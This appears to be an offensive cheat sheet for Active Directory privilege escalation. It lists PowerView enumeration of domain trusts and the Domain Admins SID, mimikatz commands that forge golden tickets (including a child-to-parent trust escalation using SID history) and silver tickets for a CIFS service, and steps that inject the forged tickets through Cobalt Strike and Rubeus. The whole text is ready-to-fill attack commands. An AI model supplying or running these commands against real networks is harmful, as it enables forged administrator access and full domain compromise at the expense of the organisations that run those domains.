
### Bidirectional Child to Parent
```
powershell Get-DomainTrust
powershell Get-DomainComputer -Domain acmebank.io  | select DnsHostName
powershell Get-DomainGroup -Identity 'Domain Admins' -Domain acmebank.io  | select ObjectSid
kerberos::golden /user:<> /domain:<Current Domain Name> /sid:<> /sids:<> /krbtgt:<>

```

### Golden Tickets

```

mimikatz kerberos::golden /user:<> /domain:<current domain> /sid:<SID of the current domain> /krbtgt:<> 
mimikatz kerberos::golden /user:Administrator /domain:<> /sid:<> /rc4:<> /ptt #With Cobalt Strike

```
### Silver Tickets
```
powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
kerberos::golden /user:Administrator /domain:Insomnia.io /sid:<> /target:DC01.insomnia.io /service:cifs /rc4: /ticket:silver.kirbi
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\silver.kirbi"))
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket:
```
